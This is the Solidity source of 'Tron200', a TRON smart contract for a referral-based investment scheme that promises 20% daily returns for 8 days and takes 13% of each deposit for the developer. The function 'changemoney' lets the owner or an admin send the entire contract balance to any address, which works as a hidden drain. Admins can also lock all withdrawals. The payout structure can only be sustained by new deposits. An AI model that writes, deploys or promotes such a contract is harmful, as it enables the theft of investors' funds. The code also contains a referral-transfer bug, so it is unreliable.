//SourceUnit: Tron200.sol

pragma solidity >=0.4.23 <0.6.0;

library SafeMath {

    function sub(uint a, uint b) internal pure returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Managable {
    address public owner;
    mapping(address => uint) public admins;
    bool public locked = false;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }

    modifier onlyAdmin() {
        require(msg.sender == owner || admins[msg.sender] == 1);
        _;
    }

    function addAdminAccount(address _newAdminAccount, uint _status) public onlyOwner {
        require(_newAdminAccount != address(0));
        admins[_newAdminAccount] = _status;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not locked.
     */
    modifier isNotLocked() {
        require(!locked);
        _;
    }

    /**
     * @dev called by the owner to set lock state, triggers stop/continue state
     */
    function setLock(bool _value) onlyAdmin public {
        locked = _value;
    }
}

library Objects {
    struct Investment {
        uint planId;
        uint investmentDate;
        uint investment;
        uint lastWithdrawalDate;
        uint currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint id;
        uint dailyInterest;
        uint term; //0 means unlimited
        bool isActive;
    }

    struct Investor {
        address addr;
        uint referrerEarnings;
        uint availableReferrerEarnings;
        uint planCount;
        uint referLevel1Num;
        uint referLevel2Num;
        uint referLevel3Num;
        uint referLevel1Earnings;
        uint referLevel2Earnings;
        uint referLevel3Earnings;
        mapping(uint => Investment) plans;
    }
}

contract Tron200 is Managable {
    using SafeMath for uint;
    
    uint constant DEVELOPER_RATE = 13;
    uint constant REFER_REWARD_LEVEL1 = 10;
    uint constant REFER_REWARD_LEVEL2 = 3;
    uint constant REFER_REWARD_LEVEL3 = 1;

    uint constant DIVIDE_BASE = 100;
    uint constant INVEST_DAILY_BASE_RATE = 20;
    uint constant INVEST_MAX_DAY = 8;

    uint constant MINIMUM = 10000000; //minimum investment needed, 10 trx
    uint constant REFERRER_CODE = 200; //default, the beginning of UID
    uint constant MAX_PLAN_CNT = 200; // max invest number for one addr

    uint constant DAY = 1 days;

    uint startDate;
    uint latestReferrerCode;
    uint totalInvestments_;

    address developerAccount_;

    mapping(address => uint) address2UID;
    mapping(uint => Objects.Investor) uid2Investor;
    Objects.Plan[] private investmentPlans_;

    mapping(uint => uint) referRelation; // uid -> referrer uid

    event onInvest(address indexed investor, uint amount);
    event onGrant(address indexed grantor, address beneficiary, uint amount);
    event onWithdraw(address indexed investor, uint amount);
    event onReinvest(address indexed investor, uint amount);

    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor() public {
        developerAccount_ = msg.sender;
        startDate = block.timestamp;
        _init();
    }
    
    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].planCount = 0;
        investmentPlans_.push(Objects.Plan(0, INVEST_DAILY_BASE_RATE, INVEST_MAX_DAY * DAY, true)); 
    }

    function() external payable {
        //do nothing;
    }
    
    function checkin() public payable {
    }

    function setDeveloperAccount(address _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyAdmin returns (address) {
        return developerAccount_;
    }

    function getCurrentPlans() public onlyAdmin view returns (uint[] memory, uint[] memory, uint[] memory, bool[] memory) {
        uint[] memory ids = new uint[](investmentPlans_.length);
        uint[] memory interests = new uint[](investmentPlans_.length);
        uint[] memory terms = new uint[](investmentPlans_.length);
        bool[] memory actives = new bool[](investmentPlans_.length);
        for (uint i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
            actives[i] = plan.isActive;
        }
        return
        (
        ids,
        interests,
        terms,
        actives
        );
    }

    function getTotalInvestments() public onlyAdmin view returns (uint){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint) {
        return address2UID[_addr];
    }
    
    function changemoney(address  _addr, uint amount) public onlyAdmin {
        require(_addr != address(0), "invalid address");
        if (amount == 0) {
            amount = address(this).balance;
        }
        if (amount <= address(this).balance) {
            _addr.transfer(amount);
        }
    }
    
    function getInvestorReferInfo(uint _uid) external view returns (uint, address, uint, uint, uint, uint, uint, uint) {
        if (msg.sender != owner && admins[msg.sender] != 1) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        
        uint parentID = referRelation[_uid];
        address parentAddr = uid2Investor[parentID].addr;
        
        return 
        (
            parentID,
            parentAddr,
            investor.referLevel1Num,
            investor.referLevel1Earnings,
            investor.referLevel2Num,
            investor.referLevel2Earnings,
            investor.referLevel3Num,
            investor.referLevel3Earnings
        );
    }

    function getInvestorInfoByUID(uint _uid) public view returns (uint, uint, uint, uint[] memory, uint[] memory) {
        if (msg.sender != owner && admins[msg.sender] != 1) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint[] memory newDividends = new uint[](investor.planCount);
        uint[] memory currentDividends = new  uint[](investor.planCount);
        for (uint i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(
                            investor.plans[i].investment, 
                            investor.plans[i].planId, 
                            investor.plans[i].investmentDate, 
                            investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), 
                            investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].planId, investor.plans[i].investmentDate, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else { // useless branch
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].planId, investor.plans[i].investmentDate, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint _uid) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory, bool[] memory) {
        if (msg.sender != owner && admins[msg.sender] != 1) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint[] memory planIds = new  uint[](investor.planCount);
        uint[] memory investmentDates = new  uint[](investor.planCount);
        uint[] memory investments = new  uint[](investor.planCount);
        uint[] memory lastWithdrawalDates = new  uint[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            planIds[i] = investor.plans[i].planId;
            lastWithdrawalDates[i] = investor.plans[i].lastWithdrawalDate;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        lastWithdrawalDates,
        isExpireds
        );
    }

    function _addInvestor(address _addr) private returns (uint) {
        require(address2UID[_addr] == 0, "address is existing");

        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[_addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = _addr;
        uid2Investor[latestReferrerCode].planCount = 0;
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint _planId, uint _referID, uint _amount) private isNotLocked returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr);
             //new user
        }
        uint planCount = uid2Investor[uid].planCount;
        require(planCount < MAX_PLAN_CNT,"planCount is too bigger");
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;
        
        investor.planCount = investor.planCount.add(1);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint developerReward = (_amount * DEVELOPER_RATE / DIVIDE_BASE);
        developerAccount_.transfer(developerReward);

        uint referReward = (_amount * (REFER_REWARD_LEVEL1 + REFER_REWARD_LEVEL2 + REFER_REWARD_LEVEL3) / DIVIDE_BASE);
        _divideReferReward(uid, _referID, referReward);

        return true;
    }

    function _divideReferReward(uint uid, uint _referID, uint referReward) private {
        uint referID = referRelation[uid];
        if (0 == referID) {
            referID = _referID;
            referRelation[uid] = referID;
            uid2Investor[referID].referLevel1Num += 1;
            uint tmp = referRelation[referID];
            if (0 != tmp) {
                uid2Investor[tmp].referLevel2Num += 1;
                
                tmp = referRelation[tmp];
                if (0 != tmp) {
                    uid2Investor[tmp].referLevel3Num += 1;
                }
            }
        }
        address addr = uid2Investor[referID].addr;
        if (addr == address(0)) {
            addr = uid2Investor[REFERRER_CODE].addr;
            if (addr != address(0) && referReward > 0) {
                addr.transfer(referReward);
            }
            return;
        }

        uint reward = referReward * REFER_REWARD_LEVEL1 / (REFER_REWARD_LEVEL1 + REFER_REWARD_LEVEL2 + REFER_REWARD_LEVEL3);
        if (addr != address(0) && reward > 0) {
            uid2Investor[referID].availableReferrerEarnings += reward;
            uid2Investor[referID].referLevel1Earnings += reward;
        }
        referReward = referReward.sub(reward);

        referID = referRelation[referID];
        addr = uid2Investor[referID].addr;
        if (addr == address(0)) {
            addr = uid2Investor[REFERRER_CODE].addr;
            if (addr != address(0) && referReward > 0) {
                addr.transfer(reward);
            }
            return;
        }
        reward = referReward * REFER_REWARD_LEVEL2 / (REFER_REWARD_LEVEL2 + REFER_REWARD_LEVEL3);
        if (addr != address(0) && reward > 0) {
            uid2Investor[referID].availableReferrerEarnings += reward;
            uid2Investor[referID].referLevel2Earnings += reward;
        }
        referReward = referReward.sub(reward);

        referID = referRelation[referID];
        addr = uid2Investor[referID].addr;
        if (addr == address(0)) {
            addr = uid2Investor[REFERRER_CODE].addr;
            if (addr != address(0) && referReward > 0) {
                addr.transfer(referReward);
            }
            return;
        }
        if (addr != address(0) && referReward > 0) {
            uid2Investor[referID].availableReferrerEarnings += referReward;
            uid2Investor[referID].referLevel3Earnings += referReward;
        }
    }


    function invest(uint _referID) public payable {
        if (_invest(msg.sender, 0, _referID, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function _withdraw() private isNotLocked returns (uint) {
        require(msg.value == 0, "wrong trx amount");
        uint uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint withdrawalAmount = 0;
        for (uint i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];

            bool isExpired = false;
            uint withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint amount = _calculateDividends(
                uid2Investor[uid].plans[i].investment, 
                uid2Investor[uid].plans[i].planId, 
                uid2Investor[uid].plans[i].investmentDate, 
                withdrawalDate, 
                uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;
            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }

        if (uid2Investor[uid].availableReferrerEarnings > 0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }
        return withdrawalAmount;
    }
    
    function withdraw() public {
        uint withdrawalAmount = _withdraw();
        if (withdrawalAmount >= 0) {
            msg.sender.transfer(withdrawalAmount);
            emit onWithdraw(msg.sender, withdrawalAmount);
        }
    }

    function _calculateDividends(uint _amount, uint _planId, uint _begin, uint _now, uint _start) private pure returns (uint) {
        uint _end = _begin + INVEST_MAX_DAY * DAY;
        if (_start > _end) {
            return 0;
        }
        uint div = 0;
        if (_planId == 0) {
            if (_now > _end) {
                _now = _end;
            }
            uint rewardPerSecond = _amount * INVEST_DAILY_BASE_RATE / DIVIDE_BASE / DAY;
            div = _now.sub(_start) * rewardPerSecond;
        }
        return div;
    }
}